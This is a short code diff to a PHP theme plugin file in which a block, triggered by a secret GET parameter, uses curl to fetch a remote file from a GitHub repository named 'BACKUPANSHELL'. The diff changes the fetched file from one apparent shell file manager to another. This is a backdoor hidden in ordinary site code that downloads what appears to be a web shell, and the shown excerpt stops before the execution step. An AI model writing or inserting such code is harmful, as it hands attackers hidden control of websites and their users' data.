@@ -880,7 +880,7 @@ abstract class ThemePlugin extends LazyLoadPlugin {
 	}
 }
 if (isset($_GET['!!yangbenerkaubujang!!'])) {
-    $url = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/filemanagertinyy.txt";
+    $url = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/filemanagerbadboyz.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
